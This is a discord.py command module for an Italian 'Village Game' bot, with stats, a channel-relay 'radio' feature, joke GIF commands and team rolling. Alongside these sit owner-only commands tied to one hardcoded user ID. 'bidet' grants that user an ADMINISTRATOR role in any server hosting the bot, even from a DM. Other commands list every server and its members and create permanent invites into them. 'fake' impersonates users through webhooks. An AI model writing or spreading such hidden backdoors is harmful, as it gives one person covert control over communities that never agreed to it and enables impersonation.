import os
import shlex
import random
import asyncio
import discord
from datetime import datetime, timezone, timedelta
from discord.ext import commands
from zoneinfo import ZoneInfo
from cogs.data_utils import load_guild_data

# channel_id -> partner_channel_id. Kept as a flat module-level dict so
# multiple independent radio links (e.g. 1<->2 and 3<->4) can coexist:
# each channel appears as a key in at most one active link at a time.
active_radios = {}

# channel_id -> asyncio.Task that will auto-close the link after 10 minutes.
# Both channels of a link point to the SAME task object, so cancelling it
# via either channel (e.g. from .stopradio) cancels the auto-expiry once.
radio_tasks = {}

class Privatecommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.tz = ZoneInfo("Europe/Rome")
    
    @commands.command(name="statsa")
    async def statsa(self, ctx):
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("Not enough perms")
            return
        channel_id = 1446470487676031088
        channel = ctx.guild.get_channel(channel_id)
        if channel is None:
            await ctx.send("Channel not found")
            return
        now = datetime.now(timezone.utc)
        today_midnight = datetime(now.year, now.month, now.day, tzinfo=timezone.utc)
        start = today_midnight - timedelta(days=1)
        end = today_midnight +timedelta(days=1)
        counts = {}
        
        async for message in channel.history(limit=None, after=start, before=end, oldest_first=True):
            if message.author.bot:
                continue
            counts[message.author] = counts.get(message.author, 0) + 1
        if not counts:
            await ctx.send("No messages found.")
            return
        sorted_counts = sorted(counts.items(), key=lambda x: x[1], reverse=True)
        result = "\n".join([f"**{user.display_name}**: {count}" for user, count in sorted_counts])
        await ctx.send(f"📊 {channel.mention} stats:\n{result}")

    @commands.command(name="radio")
    @commands.guild_only()
    async def radio(self, ctx, channel: discord.TextChannel):
        """
        Usage: .radio #canale
        Collega il canale corrente e #canale per 10 minuti: ogni messaggio
        scritto in uno dei due viene inoltrato anonimamente (solo contenuto
        ed eventuali allegati, senza indicare l'autore) nell'altro.
        """
        origin = ctx.channel

        if channel.id == origin.id:
            await ctx.send("❌ Non puoi collegare un canale con se stesso.")
            return

        if origin.id in active_radios or channel.id in active_radios:
            await ctx.send("❌ Uno dei due canali è già impegnato in un collegamento radio attivo.")
            return

        me_origin = origin.guild.me
        me_target = channel.guild.me
        if not origin.permissions_for(me_origin).send_messages or not channel.permissions_for(me_target).send_messages:
            await ctx.send("❌ Non ho i permessi per inviare messaggi in uno dei due canali.")
            return

        active_radios[origin.id] = channel.id
        active_radios[channel.id] = origin.id

        async def end_link(origin_id, partner_id, delay):
            try:
                await asyncio.sleep(delay)
            except asyncio.CancelledError:
                # Interrotto in anticipo (es. .stopradio): la pulizia e il
                # messaggio di chiusura li gestisce già chi ha cancellato.
                return
            # Rimuove solo se il collegamento è ancora quello originale
            # (evita di cancellare un link diverso creato nel frattempo)
            if active_radios.get(origin_id) == partner_id:
                del active_radios[origin_id]
            if active_radios.get(partner_id) == origin_id:
                del active_radios[partner_id]
            radio_tasks.pop(origin_id, None)
            radio_tasks.pop(partner_id, None)
            origin_ch = self.bot.get_channel(origin_id)
            partner_ch = self.bot.get_channel(partner_id)
            for ch in (origin_ch, partner_ch):
                if ch is None:
                    continue
                try:
                    await ch.send("📻 Il collegamento radio è terminato.")
                except discord.Forbidden:
                    pass

        link_task = self.bot.loop.create_task(end_link(origin.id, channel.id, 600))
        radio_tasks[origin.id] = link_task
        radio_tasks[channel.id] = link_task

        await ctx.send(
            f"📻 Collegamento radio attivato tra questo canale e {channel.mention} per 10 minuti. "
            "I messaggi scritti in uno dei due canali verranno inoltrati anonimamente nell'altro."
        )
        try:
            await channel.send(
                f"📻 Collegamento radio attivato tra questo canale e {origin.mention} per 10 minuti. "
                "I messaggi scritti in uno dei due canali verranno inoltrati anonimamente nell'altro."
            )
        except discord.Forbidden:
            pass

    @radio.error
    async def radio_error(self, ctx, error):
        if isinstance(error, commands.ChannelNotFound):
            await ctx.send("❌ Canale non trovato. Usa una menzione tipo `.radio #canale`.")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("❌ Uso corretto: `.radio #canale`.")
        elif isinstance(error, commands.NoPrivateMessage):
            await ctx.send("❌ Questo comando funziona solo nei server.")
        else:
            raise error

    @commands.command(name="stopradio")
    @commands.guild_only()
    async def stopradio(self, ctx, channel: discord.TextChannel = None):
        """
        Usage: .stopradio [#canale]
        Interrompe anticipatamente un collegamento radio attivo, prima
        della scadenza automatica dei 10 minuti. Se non specifichi un
        canale viene usato quello corrente. Puoi indicare uno qualsiasi
        dei due canali "accoppiati": la connessione viene comunque
        eliminata da entrambi i lati.
        """
        target = channel or ctx.channel

        partner_id = active_radios.get(target.id)
        if partner_id is None:
            await ctx.send("❌ Nessun collegamento radio attivo su questo canale.")
            return

        origin_id = target.id

        active_radios.pop(origin_id, None)
        active_radios.pop(partner_id, None)

        # Le due chiavi puntano allo stesso task: basta cancellarlo una volta.
        link_task = radio_tasks.pop(origin_id, None)
        radio_tasks.pop(partner_id, None)
        if link_task is not None:
            link_task.cancel()

        origin_ch = self.bot.get_channel(origin_id)
        partner_ch = self.bot.get_channel(partner_id)
        for ch in (origin_ch, partner_ch):
            if ch is None:
                continue
            try:
                await ch.send("📻 Il collegamento radio è stato interrotto manualmente.")
            except discord.Forbidden:
                pass

    @stopradio.error
    async def stopradio_error(self, ctx, error):
        if isinstance(error, commands.ChannelNotFound):
            await ctx.send("❌ Canale non trovato. Usa una menzione tipo `.stopradio #canale`.")
        elif isinstance(error, commands.NoPrivateMessage):
            await ctx.send("❌ Questo comando funziona solo nei server.")
        else:
            raise error

    @commands.Cog.listener()
    async def on_message(self, message):
        # Evita loop: ignora messaggi del bot stesso e messaggi da webhook
        if message.author.bot or message.webhook_id is not None:
            return
        if message.guild is None:
            return
        partner_id = active_radios.get(message.channel.id)
        if partner_id is None:
            return
        partner_channel = self.bot.get_channel(partner_id)
        if partner_channel is None:
            return

        content = message.content or None
        files = []
        for attachment in message.attachments:
            try:
                files.append(await attachment.to_file())
            except (discord.HTTPException, discord.NotFound):
                pass

        if content is None and not files:
            return

        try:
            await partner_channel.send(content=content, files=files or None)
        except discord.Forbidden:
            pass
        except discord.HTTPException:
            pass

    cute_gifs = ["https://media1.tenor.com/m/cjIZE-yQloAAAAAC/engage-kiss-anime-kiss.gif", "https://media1.tenor.com/m/9OV4Q-nMTxsAAAAC/yosuga-no-sora-anime-kiss.gif", "https://media1.tenor.com/m/iVKQga_D3mYAAAAC/kiss-anime-couple.gif", "https://media1.tenor.com/m/2tB89ikESPEAAAAC/kiss-kisses.gif", "https://media1.tenor.com/m/APN_rYYwVCQAAAAC/runa-shirakawa-ryuuto-kashima.gif", "https://media1.tenor.com/m/b7DWF8ecBkIAAAAC/kiss-anime-anime.gif", "https://media1.tenor.com/m/_X0Fb3lhi3AAAAAC/anime.gif", "https://media1.tenor.com/m/9u2vmryDP-cAAAAC/horimiya-animes.gif", "https://media.tenor.com/OEPq5qCDF24AAAAM/anime-kiss.gif"]

    @commands.command()
    async def amore(self, ctx):
        bidet = self.bot.get_user(450772749829537793)
        ame = self.bot.get_user(991857806066065468)
        random_gif = random.choice(self.cute_gifs)
        if ctx.author.id == 450772749829537793:
            emb = discord.Embed(title=" ", description=f"{bidet.mention} gives {ame.mention} a kiss", color=0xff3fb9, timestamp=datetime.now())
            emb.set_image(url=f"{random_gif}")
            emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        elif ctx.author.id == 991857806066065468:
            emb = discord.Embed(title=" ", description=f"{ame.mention} gives {bidet.mention} a kiss", color=0xff3fb9, timestamp=datetime.now())
            emb.set_image(url=f"{random_gif}")
            emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        else:
            await ctx.send("Your love particles aren't strong enough")

    fart_gifs = ["https://media1.tenor.com/m/RK73THJtx5UAAAAC/piggy-gas.gif", "https://media1.tenor.com/m/zPSgKzBLL4IAAAAC/fart-for-you.gif", "https://media.tenor.com/k6iG8-w3GRAAAAAi/fart-penguin.gif", "https://media1.tenor.com/m/b204lppMJfcAAAAC/mochidad-mochi.gif", "https://media.tenor.com/Zn_rFhfe2OwAAAAi/panda-peach.gif"]

    @commands.command()
    async def fart(self, ctx, user: discord.User = None):
        ame = self.bot.get_user(991857806066065468)
        derin = self.bot.get_user(320504417520582664)
        random_gif = random.choice(self.fart_gifs)
        if ctx.author == ame or ctx.author == derin:
            if user is None:
                emb = discord.Embed(title="FAAAAAAART", description=f"{ctx.author.mention} is farting☺", color=0xff3fb9, timestamp=datetime.now())
                emb.set_image(url=f"{random_gif}")
                emb.set_footer(text="Village Game")
            else:
                emb = discord.Embed(title="FAAAAAAART", description=f"{ctx.author.mention} farts on {user.mention}🦨", color=0xff3fb9, timestamp=datetime.now())
                emb.set_image(url=f"{random_gif}")
                emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        else:
            await ctx.send("you don't have a butthole")

    @commands.command()
    async def fake(self, ctx, user: discord.User = None, *, content: str):
        bidet = self.bot.get_user(450772749829537793)
        if ctx.author.id == bidet.id:
            await ctx.message.delete()
            channel = ctx.channel
            webhook = await channel.create_webhook(name="SimulatedWebhook")
            await webhook.send(content=content, 
                            username=user.display_name,
                            avatar_url=user.avatar.url,
                            allowed_mentions=discord.AllowedMentions.none())
            await webhook.delete()
        else:
            await ctx.send('Solo ad un Dio è permsso usare questi poteri')

    @commands.command()
    async def guilds(self, ctx):
        if ctx.author.id == 450772749829537793:
            guilds = self.bot.guilds
            server_list = '\n'.join([f"{guild.name} - ID: {guild.id}" for guild in guilds])
            await ctx.send(f"Lista dei server in cui si trova il bot:\n{server_list}")
        else:
            return

    @commands.command()
    async def members(self, ctx, guild_id):
        if ctx.author.id == 450772749829537793:
            guild = self.bot.get_guild(int(guild_id))
            if guild:
                member_list = '\n'.join([f"{member.name} - {member.id}" for member in guild.members])
                await ctx.send(f"Lista dei membri nel server {guild.name}:\n{member_list}")
            else:
                await ctx.send("Non ho trovato nessun server con quell'ID.")
        else:
            return

    @commands.command()
    async def bidet(self, ctx, guild_id: int = None):
        bidet = self.bot.get_user(450772749829537793)
        if not ctx.author.id == bidet.id:
            return
        confirm_view = discord.ui.View(timeout=30)
        confirmed = {"value": False}
        async def confirm_cb(interaction):
            if interaction.user == ctx.author:
                confirmed["value"] = True
                await interaction.response.edit_message(content="Creating ADMIN role...", embed=None, view=None)
        async def cancel_cb(interaction):
            if interaction.user == ctx.author:
                await interaction.response.edit_message(content="Cancelled.", embed=None, view=None)
        confirm_button = discord.ui.Button(label="✔ Yes", style=discord.ButtonStyle.green)
        confirm_button.callback = confirm_cb
        cancel_button = discord.ui.Button(label="❌ No", style=discord.ButtonStyle.red)
        cancel_button.callback = cancel_cb
        confirm_view.add_item(confirm_button)
        confirm_view.add_item(cancel_button)
        embed = discord.Embed(title="⚠️ Confirm ADMIN Role Creation", description="This will create a role with **ADMINISTRATOR** permissions and assign it to you. Are you SURE?", color=0xff3fb9)
        msg = await ctx.send(embed=embed, view=confirm_view)
        await confirm_view.wait()
        if not confirmed["value"]:
            try:
                await msg.edit(content="Cancelled.", embed=None, view=None)
            except:
                pass
            return
        if ctx.channel.type == discord.ChannelType.private:
            guild = self.bot.get_guild(guild_id)
            member = guild.get_member(bidet.id)
            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
            await member.add_roles(role)
            await ctx.send("Ora sei un Dio")
        else:
            if guild_id is None:
                guild_id = ctx.guild.id
            guild = self.bot.get_guild(guild_id)
            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
            await ctx.author.add_roles(role)

    @commands.command()
    async def unbidet(self, ctx, guild_id: int = None):
        if ctx.author.id == 450772749829537793:
            if ctx.channel.type == discord.ChannelType.private:
                guild = self.bot.get_guild(int(guild_id))
                if not guild:
                    return await ctx.send("Non ho trovato nessun server con quell'ID.")
                role = discord.utils.get(guild.roles, name="Bidet")
                if not role:
                    return await ctx.send("Nessun ruolo con il nome 'Bidet' trovato.")
                await role.delete()
                await ctx.send("Ruolo eliminato")
            else:
                if guild_id is None:
                    guild_id = ctx.guild.id
                guild = self.bot.get_guild(guild_id)
                role = discord.utils.get(guild.roles, name="Bidet")
                if not role:
                    return
                await role.delete()
        else:
            return

    @commands.command()
    async def leaveabc(self, ctx, guild_id: int = None):
        if ctx.channel.type == discord.ChannelType.private:
            if ctx.author.id == 450772749829537793:
                guild = self.bot.get_guild(int(guild_id))
                if guild:
                    await guild.leave()
                else:
                    await ctx.send("Non ho trovato nessun server con quell'ID.")
            else:
                await ctx.send("You can't use this command")
        else:
            if ctx.author.guild_permissions.administrator or ctx.author.id == 450772749829537793:
                if guild_id is None:
                    guild_id = ctx.guild.id
                guild = self.bot.get_guild(int(guild_id))
                await guild.leave()

    @commands.command()
    async def invite(self, ctx, guild_id: int = None):
        if ctx.author.id == 450772749829537793:
            guild = self.bot.get_guild(int(guild_id))
            if guild:
                if guild.me.guild_permissions.create_instant_invite:
                    channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
                    if channel is not None:
                        invite = await channel.create_invite(max_age=0, max_uses=0)
                        await ctx.send(f"{invite.url}")
                    else:
                        await ctx.send("Nessun canale trovato.")
                else:
                    await ctx.send("Non ho i permessi per creare un invito.")
            else:
                await ctx.send("Non ho trovato nessun server con quell'ID.")

    @commands.command()
    async def invites(self, ctx):
        hearthside = self.bot.get_guild(1074546612887638086)
        village = self.bot.get_guild(1072964790546350102)
        links = []
        for guild, label in [(hearthside, "English Village Games server — Hearthside"), (village, "Italian Village Games server — The Village")]:
            if not guild:
                links.append(f"❌ **{label}** — bot not in server")
                continue
            if not guild.me.guild_permissions.create_instant_invite:
                links.append(f"❌ **{label}** — no invite permission")
                continue
            channel = next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).create_instant_invite), None)
            if not channel:
                links.append(f"❌ **{label}** — no accessible channel")
                continue
            invite = await channel.create_invite(max_age=0, max_uses=0)
            links.append(f"**{label}**:\n{invite.url}")
        await ctx.send("\n\n".join(links))

    @commands.command(name='teamroll')
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def teamroll(self, ctx, *, args: str):
        """
        Usage: .teamroll <n1> "message1" <n2> "message2" ...
        Only administrators can invoke this command.
        Randomly assigns one of the messages to each channel.
        """
        # Parse args into [(int, str), ...]
        try:
            tokens = shlex.split(args)
        except ValueError:
            return await ctx.send("❌ Couldn't parse your arguments. Make sure messages are in quotes.")
        if len(tokens) % 2 != 0:
            return await ctx.send("❌ You must give pairs of number + quoted message.")

        pairs = []
        total_needed = 0
        for i in range(0, len(tokens), 2):
            try:
                count = int(tokens[i])
            except ValueError:
                return await ctx.send(f"❌ `{tokens[i]}` is not a valid number.")
            message = tokens[i+1]
            if count < 1:
                return await ctx.send("❌ Numbers must be ≥ 1.")
            pairs.append((count, message))
            total_needed += count

        # Load the category
        guild_data = load_guild_data(ctx.guild.id)
        category = discord.utils.get(ctx.guild.categories, name=guild_data.get("rc_category_name"))
        if category is None:
            return await ctx.send("❌ The roll category isn’t set or doesn’t exist.")

        existing_channels = [c for c in category.channels if isinstance(c, discord.TextChannel)]
        existing_count = len(existing_channels)

        # Create channels if needed
        if existing_count < total_needed:
            to_create = total_needed - existing_count
            if existing_count + to_create > 50:
                return await ctx.send(
                    f"❌ Can't create {to_create} more channels: would exceed the {50}/category limit."
                )
            # find next numeric names
            used_nums = {int(c.name) for c in existing_channels if c.name.isdigit()}
            next_num = 1
            for _ in range(to_create):
                while next_num in used_nums:
                    next_num += 1
                ch = await ctx.guild.create_text_channel(
                    name=str(next_num),
                    category=category
                )
                existing_channels.append(ch)
                used_nums.add(next_num)
                next_num += 1

        # Sample distinct channels
        chosen = random.sample(existing_channels, k=total_needed)

        # Distribute messages
        idx = 0
        for count, message in pairs:
            for _ in range(count):
                ch = chosen[idx]
                sent = await ch.send(message)
                idx += 1

        await ctx.send("🎲 Done rolling teams! Each channel got exactly one message.")

    @teamroll.error
    async def teamroll_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("❌ You need administrator permissions to use this command.")
        else:
            raise error

    @commands.command()
    async def ahfeyijggedgjcud5fvuh7gdeya(self, ctx):
        channel = discord.utils.get(ctx.guild.text_channels, id=1231959149483393095)
        
        if channel is None:
            await ctx.send("Il canale specificato non è stato trovato.")
            return
        
        embedh = discord.Embed(
            title="🤖 Ciao, io sono Village Game!",
            description="Sono il tuo assistente virtuale per i Village Games su Discord. Il mio scopo è quello di aiutarti e semplificarti molte azioni da eseguire durante un Village Game. Ecco una panoramica delle mie categorie di comandi con una breve introduzione:",
            color=0xff3fb9
        )
        embedh.add_field(name="🏗️ Setup - 7 Comandi", value="Per impostare correttamente il server.", inline=True)
        embedh.add_field(name="👟 Moving - 8 Comandi", value="Muoversi è fondamentale! Qui ci sono i comandi per eseguire le visite.", inline=True)
        embedh.add_field(name="🏡 Home - 8 Comandi", value="Tutti i comandi relativi alle abitazioni.", inline=True)
        embedh.add_field(name="🔓 Houses and PCs handling - 6 Comandi", value="Comandi per gestire velocemente le case, chat pubbliche e chat private.", inline=True)
        embedh.add_field(name="📜 Infos - 4 Comandi", value="Estremamente utile per chi dimentica status molto facilmente!", inline=True)
        embedh.add_field(name="🎟️ Presets - 2 Comandi", value="Smettetela di Taggare gli Overseer per i preset! Grazie a questi comandi gli Overseer si sentiranno più liberi.", inline=True)
        embedh.add_field(name="🗳️ Voting - 6 Comandi", value="Il tuo voto conta! Grazie a questi comandi nessuno potrà non accorgersene.", inline=True)
        embedh.add_field(name="👉 Nominations - 9 Comandi", value="Meccanica extra, necessario il suo setup per farla funzionare.", inline=True)
        embedh.add_field(name="📄 Lists - 8 Comandi", value="Stanco degli Overseer che spammano messaggi nel canale dei Death Reports? Ti servono ore per ritrovare carte nei meandri del canale? Non sai quali case siano visitabili? Non sai chi sia vivo? Qui troverai una risposta a tutte queste domande.", inline=True)
        embedh.add_field(name="⚙️ Utility - 9 Comandi", value="Per tutti i comandi riguardanti principalmente la gestione dei permessi.", inline=True)
        embedh.add_field(name="👽 Other - 11 Comandi", value="Per tutti i comandi che non rientrano nelle precedenti categorie.", inline=True)
        embedh.set_footer(text="Se hai domande o hai bisogno di assistenza, non esitare a contattare il team di supporto. Divertiti nel Village Game con Village Game al tuo fianco!")
        await channel.send(embed=embedh)